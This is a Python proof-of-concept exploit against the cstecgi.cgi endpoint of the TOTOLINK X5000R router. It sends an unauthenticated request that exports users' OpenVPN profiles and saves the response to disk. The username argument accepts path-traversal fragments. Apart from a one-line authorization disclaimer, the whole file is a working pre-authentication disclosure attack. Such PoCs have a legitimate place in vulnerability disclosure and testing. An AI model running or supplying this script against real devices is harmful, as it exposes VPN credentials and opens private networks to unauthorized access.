#!/usr/bin/env python3
"""
PoC for TOTOLINK X5000R cstecgi.cgi pre-auth OpenVPN profile disclosure.

Use only against devices you own or are explicitly authorized to test.
"""

import argparse
import http.client
from urllib.parse import quote, urlsplit


def parse_target(raw: str, default_port: int) -> tuple[str, int]:
    if "://" not in raw:
        raw = "http://" + raw
    parsed = urlsplit(raw)
    if not parsed.hostname:
        raise ValueError(f"invalid target: {raw}")
    return parsed.hostname, parsed.port or default_port


def request(host: str, port: int, path: str, timeout: float) -> tuple[int, bytes]:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path, headers={"Connection": "close"})
        resp = conn.getresponse()
        return resp.status, resp.read()
    finally:
        conn.close()


def build_path(username: str, gz: bool) -> str:
    # cstecgi.cgi parses fixed query positions:
    # arg0 contains exportOvpn, arg1 must be type=user, arg2 carries username,
    # arg3 is compared literally with filetype=gz when gzip export is wanted.
    filetype = "&filetype=gz" if gz else "&mode=config"
    return f"/cgi-bin/cstecgi.cgi?exportOvpn&type=user&name={quote(username, safe='../_-')}{filetype}"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Fetch OpenVPN user profile through TOTOLINK X5000R cstecgi.cgi without a web token."
    )
    parser.add_argument("target", help="target host or URL, for example 192.168.0.1")
    parser.add_argument("--http-port", type=int, default=80, help="HTTP port, default: 80")
    parser.add_argument("--user", default="alice", help="OpenVPN username or traversal fragment, default: alice")
    parser.add_argument("--gz", action="store_true", help="request .tar.gz export instead of .ovpn")
    parser.add_argument("--timeout", type=float, default=5.0, help="network timeout seconds, default: 5")
    parser.add_argument("--output", help="write response body to this file")
    parser.add_argument("--path-only", action="store_true", help="print the crafted request path and exit")
    args = parser.parse_args()

    host, port = parse_target(args.target, args.http_port)
    path = build_path(args.user, args.gz)
    if args.path_only:
        print(path)
        return 0

    status, body = request(host, port, path, args.timeout)

    print(f"[*] GET {path}")
    print(f"[*] HTTP status: {status}")
    print(f"[*] response bytes: {len(body)}")
    print(body[:240])

    if args.output:
        with open(args.output, "wb") as f:
            f.write(body)
        print(f"[+] wrote {args.output}")

    if status == 200 and body:
        print("[+] target returned an OpenVPN export without requiring a token")
        return 0
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
